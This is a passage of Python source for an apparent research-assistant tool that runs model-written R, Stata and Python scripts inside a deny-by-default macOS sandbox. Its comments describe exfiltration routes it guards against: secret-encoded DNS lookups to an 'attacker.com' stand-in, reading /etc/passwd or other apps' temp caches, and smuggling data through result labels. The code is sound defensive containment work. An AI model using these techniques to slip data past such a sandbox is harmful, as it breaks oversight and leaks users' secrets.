            *env.python.extra_read_paths,  # type: ignore[union-attr]
            str(pkg_dir),
        )

    # sandbox_exec presence is enforced above as a precondition.
    profile_path = _write_sandbox_profile(
        run_dir, cwd, extra_read_paths=extra_read_paths
    )
    cmd = [env.sandbox_exec, "-f", str(profile_path), *cmd]

    # 4. Run.
    # Subprocess cwd is language-specific:
    #   - R: the researcher's project dir, so `read.csv("survey.csv")`
    #     resolves naturally against relative paths.
    #   - Stata: the scratch dir, so Stata's batch-mode .log file lands
    #     there instead of in the researcher's project. The Stata wrapper
    #     `cd`s to the researcher's cwd before running the user's code,
    #     so relative paths in the user script still work.
    #   - Python: the researcher's project dir (same as R) — relative
    #     paths in ``pd.read_csv("survey.csv")`` resolve naturally.
    subprocess_cwd = run_dir if language == "Stata" else cwd
    # Generate a fresh per-run token. The runtime library reads it from
    # NORA_RUN_TOKEN, embeds it in every emitted payload, and (in R)
    # unsets the env var so user code loaded afterward can't read it
    # directly. See ``_validate_and_strip_token`` below.
    run_token = _generate_run_token()
    # Per-run TMPDIR. Inheriting the user's session TMPDIR (typically
    # /var/folders/<hash>/T/) re-opens reads onto every other app's
    # scratch files for the same user — Slack, Cursor, Chrome cache,
    # etc. The sandbox previously allowed those whole trees too, so
    # a script could grep them for cookies, session tokens, draft
    # documents and smuggle excerpts through any surviving channel.
    # Pin the script to a fresh per-run dir under run_dir/tmp; the
    # sandbox profile (built below) narrows file-read*/file-write*
    # to that path instead of the broad system temp roots.
    per_run_tmp = run_dir / "tmp"
    per_run_tmp.mkdir(exist_ok=True)
    # Build the subprocess env from an explicit allowlist, not
    # ``{**os.environ}``. See _SUBPROCESS_ENV_ALLOWLIST above for
    # the rationale. Nora-specific vars are set last so a
    # pathological entry in the parent env can't shadow them.
    subprocess_env = {
        **_filter_env(dict(os.environ)),
        "NORA_RESULT_PATH": str(result_path),
        "NORA_LIB_DIR": str(lib_dir),
        "NORA_CWD": str(cwd),
        # Override the inherited TMPDIR / TMP / TEMP / STATATMP so
        # R / Stata / Python's tempfile module land scratch files
        # under run_dir/tmp/ — covered by the run_dir allow rather
        # than the broad system temp roots.
        "TMPDIR": str(per_run_tmp),
        "TMP": str(per_run_tmp),
        "TEMP": str(per_run_tmp),
        "STATATMP": str(per_run_tmp),
        RUN_TOKEN_ENV_VAR: run_token,
    }

    # Snapshot cwd top-level BEFORE the subprocess runs so the diff
    # downstream can identify exactly which top-level files this run
    # created or modified. The Files panel uses this to hide script-
    # produced clutter (``ggsave("p.png")``, ``write.csv("tmp.csv")``,
    # etc.) from the researcher's view — those files are already
    # represented in the result card.
    cwd_pre_snapshot = _snapshot_cwd_top_level(cwd)

    start = time.monotonic()
    # Popen + communicate (instead of subprocess.run) so the async
    # caller can register the proc handle and ``proc.kill()`` it
    # when the asyncio task is cancelled. Without this, pressing
    # Stop while a long Stata regression / R fit / Python pipeline
    # is mid-run only cancels the Python coroutine; the subprocess
    # keeps running to completion (or to ``timeout_seconds``). From
    # the researcher's seat that looks identical to "Stop did
    # nothing".
    try:
        proc = subprocess.Popen(
            cmd,
            cwd=str(subprocess_cwd),
            env=subprocess_env,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            # New process group: ``proc.kill()`` only SIGKILLs the
            # direct child (the ``sandbox-exec`` wrapper, which
            # ``exec``s into the interpreter). Any subprocess the
            # user's script spawns — ``parallel::makeCluster`` /
            # ``mclapply`` workers in R, ``multiprocessing.Pool`` /
            # ``subprocess.Popen`` in Python, ``parallel ...`` blocks
            # in Stata — would be re-parented to init when the wrapper
            # dies and keep running, still able to append to
            # ``result.json``. ``start_new_session=True`` puts the
            # whole subtree in its own session+process group so
            # ``cancel_turn`` can `killpg` the lot.
            start_new_session=True,
        )
    except FileNotFoundError as e:
        return ExecutionResult(
            ok=False, language=language, raw_stdout="", raw_stderr="",
            exit_code=None, result_payloads=[],
            error=f"interpreter not found: {e}",
            run_dir=run_dir, script_path=script_path, duration_seconds=0.0,
        )
    if proc_register is not None:
        try:
            proc_register(proc)
        except Exception:  # noqa: BLE001 — register is advisory, never fatal
            pass

    try:
        stdout, stderr = proc.communicate(timeout=timeout_seconds)
    except subprocess.TimeoutExpired:
        # Same recovery as ``subprocess.run`` does: kill, drain,
        # report partial output. Without the second communicate(),
        # the .stdout/.stderr buffers stay attached to the killed
        # proc and the file descriptors leak into the run dir's
        # parent process.
        # Whole-process-group kill — ``start_new_session=True`` above
        # detaches the subprocess into its own session, so any
        # parallel/multiprocessing workers the user's script
        # spawned are reachable via ``killpg``. Otherwise they'd
        # outlive the timeout and keep writing to ``result.json``.
        import signal as _signal
        try:
            os.killpg(os.getpgid(proc.pid), _signal.SIGKILL)
        except (ProcessLookupError, PermissionError, OSError):
            try:
                proc.kill()
            except Exception:  # noqa: BLE001
                pass
        try:
            stdout, stderr = proc.communicate(timeout=2)
        except subprocess.TimeoutExpired:
            stdout, stderr = "", ""
        duration = time.monotonic() - start
        # Tag any cwd files this run created before the timeout —
        # a script that wrote a half-finished dataset before getting
        # killed still produced clutter the panel should hide.
        _write_cwd_writes_manifest(cwd, run_dir, cwd_pre_snapshot)
        # Register the token even on timeout: the helper library may
        # have written valid token-bearing manifest entries before
        # the kill, and the runner's re-validation needs the token
        # to recognize them. Without this, every timed-out run drops
        # all its plots — including ones the helper library wrote
        # legitimately seconds before the kill.
        register_run_token(run_dir, run_token)
        return ExecutionResult(
            ok=False, language=language,
            raw_stdout=stdout or "",
            raw_stderr=stderr or "",
            exit_code=None, result_payloads=[],
            error=f"script timed out after {timeout_seconds}s",
            run_dir=run_dir, script_path=script_path,
            duration_seconds=duration,
        )

    duration = time.monotonic() - start
    exit_code = proc.returncode
    # Tag cwd files this run created or modified. Runs after the
    # subprocess has fully finished writing; before any consumer
    # (Files panel) reads the manifest.
    _write_cwd_writes_manifest(cwd, run_dir, cwd_pre_snapshot)

    # 5. Collect output. For Stata batch mode, real output lives in a
    # .log file next to the .do script rather than stdout.
    raw_stdout = stdout or ""
    raw_stderr = stderr or ""
    if language == "Stata":
        log_contents = _read_stata_log(script_path)
        if log_contents:
            raw_stdout = log_contents + (("\n" + raw_stdout) if raw_stdout else "")

    # Persist the raw subprocess output to the run dir so the researcher
    # TUI (and, if needed, later audit) can display what R / Stata / Python
    # actually said. The raw .log files NEVER cross to the model; there
    # is no file-read tool. The model can see a *short debug excerpt* on
    # script failure (see ``error_summary.extract_debug_excerpt``), which
    # is anchored on each language's error idiom, capped at 1 KB, and
    # passes through credential scrub plus path normalisation plus
    # dumpy-blob truncation. See ``test_error_summary_no_leak.py`` for
    # the SDC boundary regressions, and ``test_stderr_isolation.py`` for
    # the broader "no raw log file ever crosses" pin.
    # No-follow writes: stdout.log / stderr.log land in run_dir
    # which is script-writable, and the host runs unsandboxed.
    # A script can plant a symlink at either path before exiting,
    # so the host's write follows the link and overwrites
    # attacker-chosen files. The helper refuses to follow;
    # persistence failure isn't fatal — raw output still lives
    # in the ExecutionResult fields for in-process rendering.
    _write_text_no_follow(run_dir / "stdout.log", raw_stdout)
    _write_text_no_follow(run_dir / "stderr.log", raw_stderr)

    # 6. Parse result file. The runtime libraries write JSONL (one
    # payload per line). A script that calls a single helper produces
    # one line; one that calls N helpers produces N lines, in
    # emission order. Each line is independently token-validated.
    #
    # Partial-success surface: when a script aborts mid-loop after
    # emitting some helpers, we KEEP the payloads that parsed and
    # validated cleanly. The caller decides what to do with them
    # (submit_script returns them under status="execution_failed_partial").
    # Without this, a script doing 24 specs that hit a thin cell on
    # iteration #5 would lose the four good results — the same loss
    # mode multi-result was meant to fix.
    payloads: list[dict] = []
    error: str | None = None
    warnings: list[str] = []
    if not result_path.exists():
        error = (
            "script finished but did not emit a structured result — no file "
            f"was written to {result_path.name}. Make sure your script "
            f"calls the Nora runtime library ({_runtime_call_hint(language)})."
        )
    else:
        try:
            # Enforce the file-byte cap up front so we don't allocate
            # a huge string for parsing. If the file is over-cap we
            # read just the first MAX_RESULT_FILE_BYTES bytes — any
            # JSONL line straddling the cut is dropped by the parser
            # via JSONDecodeError, and the truncation flag is set.
            file_size = result_path.stat().st_size
            byte_truncated = file_size > MAX_RESULT_FILE_BYTES
            with result_path.open("r", encoding="utf-8", errors="replace") as fh:
                if byte_truncated:
                    text = fh.read(MAX_RESULT_FILE_BYTES)
                else:
                    text = fh.read()
        except OSError as oe:
            error = f"could not read result file: {oe}"
        else:
            payloads, bad_lines, count_truncated = _parse_result_jsonl(text, run_token)
            if byte_truncated or count_truncated:
                cap_label = (
                    f"{MAX_RESULT_PAYLOADS} payload entries"
                    if count_truncated
                    else f"{MAX_RESULT_FILE_BYTES // (1024 * 1024)} MB result-file size"
                )
                warnings.append(
                    f"result truncated at {cap_label}; later helper "
                    f"emissions were dropped. If this is intentional, "
                    f"split the run into smaller batches."
                )
            if bad_lines:
                bad_msg = _format_bad_lines_summary(bad_lines, len(payloads))
                # Two paths, two meanings:
                #   - Some payloads survived alongside bad lines: the
                #     bad lines are an advisory, not a failure. A
                #     24-spec script with one runtime-library glitch
                #     on spec #5 should stay ``ok=True`` and surface
                #     the 23 good results — the prior "any bad line
                #     ⇒ ok=False" behavior demoted these to
                #     "execution_failed_partial", which reads to the
                #     model as "the script aborted" even when the
                #     subprocess exited 0.
                #   - No payloads survived: the bad-line message IS
                #     the only signal we have (this is the bypass-
                #     attempt case — a forged JSON line that fails
                #     the auth-token check produces zero survivors).
                #     Keep it in ``error`` so the caller sees a
                #     fatal-shaped response and the security signal
                #     isn't buried under a non-blocking warning.
                if payloads:
                    warnings.append(bad_msg)
                else:
                    error = bad_msg
            if error is None and not payloads:
                error = (
                    "script finished but emitted an empty result file. "
                    "Make sure your script calls the Nora runtime "
                    f"library ({_runtime_call_hint(language)})."
                )

    ok = (exit_code == 0) and bool(payloads) and (error is None)
    if not ok and error is None:
        error = f"interpreter exited with non-zero code {exit_code}"

    # Filter the plot manifest before any consumer (the runner's
    # ``_capture_plots``, ``submit_script``'s ``_summarize_plot_helpers``,
    # the recall path's allowlist check) reads it. Any entry whose
    # ``_token`` is missing or doesn't match the per-run token gets
    # dropped (script-injected entries gone). Done here rather than
    # at every consumer so there's exactly one trust boundary, and
    # because the recall path runs later when the per-run token is
    # no longer available to revalidate.
    dropped_manifest = _filter_plot_manifest(run_dir, run_token)
    if dropped_manifest:
        warnings.append(
            f"dropped {dropped_manifest} plot manifest entr"
            f"{'y' if dropped_manifest == 1 else 'ies'} "
            f"with missing or invalid authenticity token, "
            f"likely hand-crafted by the script bypassing the "
            f"helper library"
        )

    # Register the per-run token so the runner's ``_capture_plots``
    # can re-validate manifest entries directly. The on-disk filter
    # above is a best-effort optimization (smaller manifest); the
    # runner-side validation is the load-bearing one because the
    # manifest lives in script-writable territory and the rewrite
    # CAN fail without the token validation getting a second chance.
    register_run_token(run_dir, run_token)

    return ExecutionResult(
        ok=ok, language=language,
        raw_stdout=raw_stdout, raw_stderr=raw_stderr,
        exit_code=exit_code, result_payloads=payloads,
        error=error,
        run_dir=run_dir, script_path=script_path,
        duration_seconds=duration,
        warnings=warnings,
    )


# ---------------------------------------------------------------------------
# Staging
# ---------------------------------------------------------------------------

def _make_run_dir(cwd: Path) -> Path:
    """Create a fresh per-run directory under <cwd>/.nora/runs/."""
    # Ensure .nora exists at mode 0o700 BEFORE creating the per-run
    # subtree. ``p.mkdir(parents=True, ...)`` would silently create
    # ``.nora`` with the default umask (0o755 on most systems), leaving
    # the raw subprocess logs (stdout.log / stderr.log), the pre-SDC
    # result.json, and the researcher-authored script file all
    # world-readable on shared filesystems. Gating .nora gates every
    # descendant via the no-execute-on-parent rule.
    from nora.config import ensure_private_nora_dir
    ensure_private_nora_dir(cwd)
    timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    run_id = uuid.uuid4().hex[:8]
    p = cwd / RUNS_SUBDIR / f"{timestamp}_{run_id}"
    p.mkdir(parents=True, exist_ok=True)
    return p


def _stage_runtime(run_dir: Path, language: Language) -> Path:
    """Copy the Nora runtime library for `language` into ``run_dir/lib``.

    Copying (rather than referencing) means the script sees a stable
    on-disk path regardless of whether Nora was installed as a wheel,
    frozen by PyInstaller, or run from source — and simplifies the
    Stata adopath case.
    """
    lib_dir = run_dir / "lib"
    lib_dir.mkdir(exist_ok=True)
    runtime_pkg = resources.files("nora.runtime")
    if language == "R":
        for name in ("nora.R",):
            src = runtime_pkg.joinpath(name)
            (lib_dir / name).write_text(src.read_text(encoding="utf-8"))
    elif language == "Stata":
        stata_ados = (
            "_nora_export_plot.ado",
            "nora_result_regress.ado",
            "nora_result_ttest.ado",
            "nora_ttest.ado",
            "nora_result_sum.ado",
            "nora_result_tab.ado",
            "nora_result_magnitude.ado",
            "nora_result_correlation.ado",
            "nora_plot_residuals.ado",
            "nora_plot_coefficients.ado",
            "nora_plot_interaction.ado",
            "nora_plot_estimate_comparison.ado",
            "nora_safe_export.ado",
        )
        for name in stata_ados:
            src = runtime_pkg.joinpath(name)
            (lib_dir / name).write_text(src.read_text(encoding="utf-8"))
    else:  # Python
        # Single module — staged into lib_dir which the script's
        # subprocess sees on PYTHONPATH (set in subprocess_env).
        # Researchers ``import nora`` to reach the helpers exactly
        # the way the R library does ``nora$from_lm`` / Stata does
        # ``nora_result_regress``.
        src = runtime_pkg.joinpath("nora.py")
        (lib_dir / "nora.py").write_text(src.read_text(encoding="utf-8"))
    return lib_dir


def _write_script(run_dir: Path, language: Language, code: str) -> Path:
    """Persist Claude's code to disk.

    For Stata, prepends a small preamble that adds the Nora runtime
    library to the adopath and `cd`s into the researcher's working
    directory (so `use "data.dta"` in the user's code resolves against
    their project, not the scratch dir). The researcher's code and the
    preamble live in a single `.do` file with a visible separator — we
    used to split preamble and user code across two files with an
    internal `do "<user_path>"`, but that path was absolute and broke
    when the researcher's cwd contained spaces: Stata's own parser for
    the `-b do <path>` command line tokenizes on spaces and the nested
    `do` inherited the same risk. Concatenating avoids both issues and
    keeps the scratch dir easy to audit.
    """
    if language == "R":
        path = run_dir / "script.R"
        path.write_text(code, encoding="utf-8")
        return path
    if language == "Python":
        # Two-line preamble puts the staged ``nora.py`` AND the Nora
        # Python package install dir on ``sys.path``. We use a
        # preamble (rather than PYTHONPATH) because the interpreter
        # is invoked with ``-I`` (isolated mode), which ignores all
        # PYTHON* env vars by design — keeps a researcher's stray
        # ``PYTHONSTARTUP`` from running before their script. Same
        # shape as the Stata adopath preamble: explicit, visible in
        # the scratch dir, easy to audit.
        #
        # The Nora pkg dir entry is critical for the
        # ``install_packages`` → ``submit_script`` path. ``--user``
        # writes get filtered by ``-I`` and the sandbox; ``--target
        # <nora_python_pkg_dir>`` is the path both surfaces share.
        # See ``package_installer.nora_python_pkg_dir``.
        #
        # ORDER matters here: ``lib_dir`` MUST end up before
        # ``pkg_dir`` on ``sys.path`` so the staged Nora runtime
        # always wins over any installed package of the same name.
        # If pkg_dir came first, a model-authored
        # ``install_packages(["nora"])`` call (or any package whose
        # wheel ships a top-level ``nora`` module) would shadow the
        # staged ``nora.py``, bypassing the ``NORA_RUN_TOKEN`` pop
        # and the authenticity-token machinery the runtime owns.
        # And we ``append`` pkg_dir (rather than ``insert(0, ...)``)
        # so it sits after stdlib — an installed package can't
        # shadow ``os`` / ``json`` / etc.
        from nora.package_installer import nora_python_pkg_dir
        from nora.env_detect import find_python
        lib_dir = run_dir / "lib"
        py_tool = find_python()
        preamble_lines = [
            "import sys as _nora_sys",
        ]
        if py_tool is not None:
            pkg_dir = nora_python_pkg_dir(py_tool.binary)
            preamble_lines.append(
                f"_nora_sys.path.append({str(pkg_dir)!r})"
            )
        preamble_lines.append(
            f"_nora_sys.path.insert(0, {str(lib_dir)!r})"
        )
        preamble_lines.append("del _nora_sys")
        preamble_lines.append(
            "# ----- Nora preamble above; researcher code below -----"
        )
        preamble = "\n".join(preamble_lines) + "\n\n"
        path = run_dir / "script.py"
        path.write_text(preamble + code + "\n", encoding="utf-8")
        return path
    # Stata: single .do file. Preamble + separator + researcher code.
    # Quoted paths in Stata's `adopath +` and `cd` handle spaces fine
    # at the language level — only the command-line `-b do <path>`
    # has the tokenization bug (see _stata_command).
    #
    # Shadowing defense: Stata batch mode runs ``~/ado/profile.do`` at
    # startup BEFORE the user's do file, so any program defined there
    # (``program define nora_result_regress ...malicious...``) ends
    # up in memory ahead of the preamble. Stata's resolver checks
    # in-memory programs before the adopath, so a tampered profile.do
    # would shadow the staged ``nora_result_regress.ado`` (and any
    # other helper) even though the adopath ``+ NORA_LIB_DIR`` runs
    # first.
    #
    # We previously used ``capture program drop _all`` to nuke every
    # in-memory program. That defended Nora's helpers but ALSO wiped
    # the researcher's own profile.do helpers (custom estimators,
    # workflow shortcuts) — scripts that work in plain Stata then
    # failed inside Nora. Switching to an explicit drop list keeps
    # the shadowing defense tight without touching unrelated user
    # programs. Names mirror ``_stage_runtime_library``'s ``stata_ados``
    # tuple; new helpers added there must be added here too. ``capture``
    # suppresses the error when a name isn't currently defined (the
    # common case — most profile.do files don't pre-define any of
    # these).
    nora_program_drops = "\n".join([
        "capture program drop nora_result_regress",
        "capture program drop nora_result_ttest",
        "capture program drop nora_ttest",
        "capture program drop nora_result_sum",
        "capture program drop nora_result_tab",
        "capture program drop nora_result_magnitude",
        "capture program drop nora_result_correlation",
        "capture program drop nora_plot_residuals",
        "capture program drop nora_plot_coefficients",
        "capture program drop nora_plot_interaction",
        "capture program drop nora_plot_estimate_comparison",
        "capture program drop nora_safe_export",
        "capture program drop _nora_export_plot",
    ])
    preamble = (
        f"{nora_program_drops}\n"
        "local lib : env NORA_LIB_DIR\n"
        "adopath + \"`lib'\"\n"
        "local nora_cwd : env NORA_CWD\n"
        "cd \"`nora_cwd'\"\n"
        "\n"
        "*! ----- Nora preamble above; researcher code below -----\n"
        "\n"
    )
    script_path = run_dir / "script.do"
    script_path.write_text(preamble + code + "\n", encoding="utf-8")
    return script_path


# ---------------------------------------------------------------------------
# Command composition
# ---------------------------------------------------------------------------

def _python_command(python: str, script_path: Path) -> list[str]:
    """Compose a ``python3`` invocation for the user's script.

    ``-I`` (isolated mode) cuts the per-user site-packages dir and
    ``PYTHONSTARTUP`` out of the picture so the script runs against
    the interpreter's stdlib + the Nora-staged runtime + whatever's
    on ``PYTHONPATH`` (which the executor sets to ``lib_dir`` plus
    inherited paths). No ``site.USER_BASE`` reads, no surprise
    pre-script hooks.
    """
    return [python, "-I", str(script_path)]


def _r_command(rscript: str, lib_dir: Path, script_path: Path) -> list[str]:
    """Compose `Rscript` invocation that sources the runtime before the script.

    Using ``-e`` keeps the wrapper logic transparent: researchers reading
    the scratch dir see their code unchanged, and the Nora preamble
    is explicit in the process args.
    """
    source_lib = (lib_dir / "nora.R").as_posix()
    source_script = script_path.as_posix()
    bootstrap = (
        f'source({_r_quote(source_lib)}); '
        f'source({_r_quote(source_script)})'
    )
    return [rscript, "--vanilla", "-e", bootstrap]


def _r_quote(s: str) -> str:
    """R string literal with double quotes, backslash-escaped."""
    escaped = s.replace("\\", "\\\\").replace('"', '\\"')
    return f'"{escaped}"'


def _stata_command(stata: str, lib_dir: Path, script_path: Path) -> list[str]:
    """Compose `stata-mp -b do` invocation.

    Stata's batch mode writes output to a .log file next to the .do
    script (not stdout), so the executor reads that log after the
    process exits.

    Path handling: we pass the script as a **bare filename** and rely
    on the subprocess cwd being the scratch dir. Absolute paths don't
    work here — Stata's batch-mode argument parser tokenizes
    ``-b do <path>`` on spaces, so a researcher whose project lives
    under ``~/IESE Dropbox/...`` would hit ``file /Users/bb/IESE.do
    not found`` even though the shell passed a perfectly-quoted
    argument. See ``run_script`` for where subprocess_cwd is set to
    run_dir for Stata.
    """
    del lib_dir  # the .do script itself prepends adopath with $NORA_LIB_DIR
    return [stata, "-b", "-q", "do", script_path.name]


def _read_stata_log(script_path: Path | None) -> str:
    """Return the Stata batch log contents, or '' if missing."""
    if script_path is None:
        return ""
    log_path = script_path.with_suffix(".log")
    if not log_path.exists():
        return ""
    try:
        return log_path.read_text(encoding="utf-8", errors="replace")
    except OSError:
        return ""


# ---------------------------------------------------------------------------
# Sandbox profile
# ---------------------------------------------------------------------------

def _sandbox_profile_string(
    run_dir: Path, cwd: Path, home: Path | None = None,
    extra_read_paths: tuple[str, ...] = (),
) -> str:
    """Build the SBPL profile text. Pure function — no I/O.

    Split from ``_write_sandbox_profile`` so unit tests can inspect the
    generated profile without needing sandbox-exec to be callable in
    the test environment. See ``test_executor_profile.py`` for the
    invariants the profile must satisfy.

    ``extra_read_paths`` is for runtimes whose interpreter lives
    outside the system trees the default profile already covers
    (e.g. a venv'd Python). Each entry is added as a read-subpath.
    """
    return _build_profile(
        run_dir, cwd, home or Path.home(), extra_read_paths,
    )


def _write_sandbox_profile(
    run_dir: Path, cwd: Path,
    extra_read_paths: tuple[str, ...] = (),
) -> Path:
    """Write a per-run sandbox-exec profile and return its path.

    Uses a ``(deny default)`` posture with explicit allowlists, so that
    a script spawned under the profile can read:

    - System and library trees needed by R/Stata to load their own code
      (``/System``, ``/Library``, ``/usr``, ``/bin``, ``/opt``, etc.).
    - The user's R package library under ``~/Library/R`` and Stata's
      user config under ``~/Library/Application Support/Stata`` plus
      the conventional ``~/ado`` adopath.
    - The researcher's working directory ``cwd`` — where data files
      live — and the scratch ``run_dir`` for the current invocation.

    and write only to:

    - The scratch ``run_dir`` (where ``NORA_RESULT_PATH`` lives and
      where Stata drops its batch ``.log``).
    - System temp directories (``/tmp``, ``/private/tmp``,
      ``/private/var/folders``) — R and Stata both stage scratch files
      under ``$TMPDIR`` which is normally a subpath of one of these.
    - Console device files (``/dev/null``, ``/dev/tty``, a pty) that
      shells / subprocess plumbing write to.

    Everything else — including the rest of the user's home dir, so
    ``~/.ssh``, ``~/.aws``, ``~/.gnupg``, Keychains — is denied.
    Network is denied entirely.

    This profile is the load-bearing enforcement of the data-boundary
    story. Without it, a malicious script could read arbitrary files
    and smuggle their contents out through ``label`` / coefficient-name
    fields in the result payload; with it, the script can only see
    ``cwd``, and the runtime-library-only I/O convention plus the
    sanitizer allowlist become the only paths to Claude's context.

    Notes on specific SBPL details:

    - ``(literal "/")`` is required in addition to the child subpaths
      because some metadata reads land on ``/`` itself (``stat("/")``)
      and a subpath of a child dir does not cover the parent.
    - ``file-read-metadata`` is allowed globally: ``stat()`` on paths
      outside the read allowlist is still permitted, which R/Stata's
      library-loading code paths rely on when probing for files. Only
      reading *contents* (``file-read-data``, open-for-read) is
      restricted.
    - The ``/dev/ttys*`` regex covers pseudo-terminals that subprocess
      pipes may briefly touch.
    """
    profile = _build_profile(run_dir, cwd, Path.home(), extra_read_paths)
    path = run_dir / "sandbox.sb"
    path.write_text(profile)
    return path


def _build_profile(
    run_dir: Path, cwd: Path, home: Path,
    extra_read_paths: tuple[str, ...] = (),
) -> str:
    """Construct the SBPL text. Separated so it can be unit-tested
    without filesystem I/O (see ``_sandbox_profile_string``).
    """
    r_user_lib = home / "Library" / "R"
    stata_user_config = home / "Library" / "Application Support" / "Stata"
    stata_user_ado = home / "ado"

    def _quote(p: Path | str) -> str:
        """Quote a path as an SBPL string literal.

        SBPL string literals are double-quoted with ``\\`` / ``"``
        escaping. Paths that contain either are extremely rare on macOS
        but we escape defensively so the profile can't be broken (or
        widened) by an unusual cwd.
        """
        s = str(p)
        return '"' + s.replace("\\", "\\\\").replace('"', '\\"') + '"'

    # Per-run write scope: the run's scratch dir (result file, Stata
    # .log, staged script, and run_dir/tmp via TMPDIR override), and
    # the researcher's cwd (so scripts can ``save "panel.dta", replace``
    # / ``saveRDS`` / ``df.to_csv``).
    #
    # The researcher's cwd is the analysis workspace. Every session
    # gets its own dir under ``~/.nora-sessions/`` so a script writing
    # there cannot reach personal files. The data-boundary the
    # sandbox enforces is the *network deny* and the *read* allowlist
    # (so a script can't slurp ``/etc/passwd`` or POST data to a
    # remote host); writes within the user-authorized cwd are part of
    # the normal Stata / R / Python workflow.
    #
    # NOT in this list (deliberately): /private/tmp, /private/var/folders,
    # /tmp. Those system temp roots hold scratch files from every
    # other app the same user is running (Slack, Cursor, Chrome
    # caches). Granting read+write subpath there let a script grep
    # cross-app secrets and smuggle excerpts back through any
    # surviving channel (helper labels, etc.). The executor instead
    # sets TMPDIR=<run_dir>/tmp for the subprocess, so R / Stata /
    # Python's tempfile module land scratch files inside the
    # run-dir allow.
    write_subpaths = [
        _quote(run_dir),
        _quote(cwd),
    ]
    write_literals = [
        _quote("/dev/null"),
        _quote("/dev/dtracehelper"),
        _quote("/dev/tty"),
    ]

    # Narrow /private/etc reads to the specific config files R/Stata
    # actually need. The previous `(subpath "/private/etc")` re-opened
    # reads on /etc/passwd (user GECOS, home dirs, shells), /etc/group,
    # /etc/sudoers.d, etc. — all of which a malicious script could
    # exfiltrate character-by-character through sanitizer-allowed label
    # fields. This list is an empirical starting point; expand if a
    # future R/Stata version probes another config file at startup.
    read_literals = [
        _quote("/private/etc/hosts"),
        _quote("/private/etc/localtime"),
        _quote("/private/etc/resolv.conf"),
        _quote("/private/etc/protocols"),
        _quote("/private/etc/services"),
        _quote("/private/etc/nsswitch.conf"),
    ]

    # Per-run read scope: system trees needed by R/Stata to bootstrap
    # themselves, plus the researcher's cwd (data) and the runtime
    # staging dir.
    #
    # The top-level dirs are deliberately NOT allowed as whole
    # subtrees. `/private` in particular would re-open reads on
    # `/private/var/log`, `/private/var/backups`, and other sensitive
    # subpaths that R/Stata don't need. `/Library` similarly contains
    # `/Library/Keychains` and `/Library/LaunchDaemons`. Each child is
    # listed explicitly so the boundary is "researcher cwd + runtime
    # dirs + only the system subpaths the interpreter actually needs."
    #
    # Everything under $HOME *except* the explicit R/Stata user
    # subpaths is denied, which is the whole point of the boundary.
    read_subpaths = [
        _quote("/System"),
        # /Library — only the subtrees R / Stata / Rosetta reach into.
        _quote("/Library/Apple"),
        _quote("/Library/Application Support"),
        _quote("/Library/Caches"),
        _quote("/Library/Frameworks"),
        _quote("/Library/Managed Preferences"),
        _quote("/Library/Preferences"),
        # /usr — skip /usr/sbin (R/Stata don't use privileged tools).
        _quote("/usr/bin"),
        _quote("/usr/lib"),
        _quote("/usr/libexec"),
        _quote("/usr/local"),
        _quote("/usr/share"),
        _quote("/bin"),
        _quote("/sbin"),
        _quote("/opt"),
        _quote("/dev"),
        _quote("/Applications"),
        # /private — only the subtrees needed for POSIX config,
        # user/group resolution, and timezone data. Notably: /private/etc
        # is NOT a subpath — specific config files are allowed via
        # read_literals above. See the comment on that list for why.
        #
        # NOT in this list (deliberately): /private/tmp,
        # /private/var/folders. Those trees contain scratch files
        # from every app the same user is running — granting read
        # subpath there let a model-authored script enumerate other
        # apps' caches / session tokens / draft documents. The
        # executor sets TMPDIR=<run_dir>/tmp for the subprocess so
        # R / Stata / Python's tempfile module lands inside the
        # run_dir allow without needing the broad temp roots.
        _quote("/private/var/db/dslocal"),
        _quote("/private/var/db/timezone"),
        _quote(r_user_lib),
        _quote(stata_user_config),
        _quote(stata_user_ado),
        _quote(cwd),
        _quote(run_dir),
    ]
    # Per-language extras (typically a Python interpreter's sys.prefix
    # so it can read its own stdlib + site-packages). Only added when
    # the executor is running a language that needs them; absent for
    # R / Stata runs.
    for p in extra_read_paths:
        if p:
            read_subpaths.append(_quote(p))

    # Carve ``.nora`` out of the cwd allow. The cwd allow gives scripts
    # the analysis workspace, but ``<cwd>/.nora`` holds Nora's own
    # session state — chat_history.jsonl, results.db, prior run scripts
    # and stdout/stderr logs, helper plot manifests. Those files are
    # exactly the raw / pre-sanitization material the tool layer keeps
    # out of model-visible context. A model-authored script left to
    # roam under ``<cwd>/.nora`` could read them and smuggle excerpts
    # back through any sanitizer-allowed channel (label fields, helper
    # error bodies, even an unsanitized stdout line on a non-result
    # path), or corrupt the persisted session state to influence
    # future turns.
    #
    # SBPL rule precedence is "last match wins", so we re-emit the
    # allow for cwd, follow it with a deny for ``<cwd>/.nora``, and
    # finish with a re-allow for the current ``run_dir`` (which IS
    # under ``<cwd>/.nora/runs/<id>/`` — the script needs to read
    # its staged runtime library and write its result.json there).
    # Anything else under ``.nora`` falls through to the deny.
    nora_dir = cwd / ".nora"
    return (
        "(version 1)\n"
        "(deny default)\n"
        "\n"
        "; Network — load-bearing. Scripts cannot exfiltrate data off-box.\n"
        "(deny network*)\n"
        "\n"
        "; Process / IPC / signal operations R and Stata expect.\n"
        "(allow process*)\n"
        "(allow mach*)\n"
        "(allow iokit*)\n"
        "(allow sysctl*)\n"
        "(allow ipc-posix*)\n"
        "(allow signal)\n"
        "\n"
        "; Close the Mach-IPC bridge to system daemons that perform\n"
        "; network I/O on the caller's behalf. ``(deny network*)``\n"
        "; alone is insufficient: macOS's ``getaddrinfo()`` /\n"
        "; ``res_query()`` route DNS lookups through mDNSResponder,\n"
        "; which runs OUTSIDE this sandbox and issues the actual UDP\n"
        "; packets. A script that does\n"
        ";   getaddrinfo(\"<base32-encoded-secret>.attacker.com\")\n"
        "; never touches the network from its own process — the\n"
        "; ``(deny network*)`` rule above doesn't fire — but the\n"
        "; encoded subdomain still reaches the attacker's nameserver.\n"
        ";\n"
        "; SBPL evaluates rules in declaration order with last-match-\n"
        "; wins, so these denies override the (allow mach*) above for\n"
        "; the specific global-names. R and Stata don't need to talk\n"
        "; to these daemons at script-time; ``install_packages`` runs\n"
        "; outside the sandbox where it has full network and mach\n"
        "; access. The list isn't claimed to be exhaustive — other\n"
        "; system services may also bridge to the network — but it\n"
        "; closes the canonical mDNSResponder bypass.\n"
        "(deny mach-lookup\n"
        "    (global-name \"com.apple.mDNSResponder\")\n"
        "    (global-name \"com.apple.mDNSResponderHelper\")\n"
        "    (global-name \"com.apple.dnsextensiond\")\n"
        "    (global-name \"com.apple.networkserviceproxy\")\n"
